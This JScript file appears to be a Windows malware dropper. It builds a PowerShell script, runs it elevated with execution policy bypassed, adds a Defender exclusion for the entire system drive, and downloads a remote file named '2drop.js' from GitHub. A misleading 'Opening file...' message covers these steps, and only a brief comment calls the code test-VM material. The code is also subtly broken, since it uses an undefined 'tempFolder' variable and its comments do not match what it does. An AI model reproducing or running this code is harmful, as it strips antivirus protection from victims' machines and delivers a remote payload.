// run-defender-keep-open.js
// Writes a temporary PowerShell script and launches it elevated with -NoExit so the PS window stays open.
// WARNING: Changes Defender settings and adds exclusion for system drive. Use only in test VM.

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// Build temp PS file path
// Get directory of the running .js file; fallback to %TEMP% if unavailable
var programFiles = shell.ExpandEnvironmentStrings("%TEMP%");
var psFilename = "apply_defender_temp_" + (new Date().getTime()) + ".ps1";
var psPath = tempFolder + "\\" + psFilename;

// PowerShell script content (robust with try/catch and readable output)
// NOTE: the script will create a unique empty folder inside the user's Documents and put 2drop.js there.
var psContent =
'Write-Output "Opening file...";\n' +
'Try {\n' +
'    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
'\n' +
'    # Create a unique folder inside Documents and download the file there\n' +
'    $docs = [Environment]::GetFolderPath("MyDocuments");\n' +
'    $folderName = "download_2drop_" + (Get-Date -Format "yyyyMMdd_HHmmss");\n' +
'    $targetDir = Join-Path -Path $docs -ChildPath $folderName;\n' +
'    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null;\n' +
'\n' +
'    $url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2drop.js";\n' +
'    $destination = Join-Path -Path $targetDir -ChildPath "2drop.js";\n' +
'    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing;\n' +
'\n' +
'    # Open File Explorer and highlight the downloaded file\n' +
'    Start-Process explorer.exe "/select,`\"$destination`\"";\n' +
'    Write-Output ("Downloaded to: " + $destination);\n' +
'    Write-Output ("Opened folder: " + $targetDir);\n' +
'} Catch {\n' +
'    Write-Error $_.Exception.Message;\n' +
'}\n' +
'Write-Output "Script complete. -NoExit kept the window open.";\n';

// Write the PS script to temp
try {
    var file = fso.CreateTextFile(psPath, true);
    file.Write(psContent);
    file.Close();
} catch (e) {
    shell.Popup("Failed to write temp PowerShell script: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}

// Build command that starts an elevated PowerShell to run the PS file with -NoExit
// We use Start-Process ... -Verb RunAs so the user gets the UAC prompt and the PS window stays visible.
var elevateCmd = "powershell -NoProfile -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + psPath + "\\\"' -Verb RunAs\"";

try {
    shell.Run(elevateCmd, 1, false); // show window; do not wait (PS will stay open)
} catch (e) {
    shell.Popup("Failed to launch elevated PowerShell: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}

WScript.Quit(0);





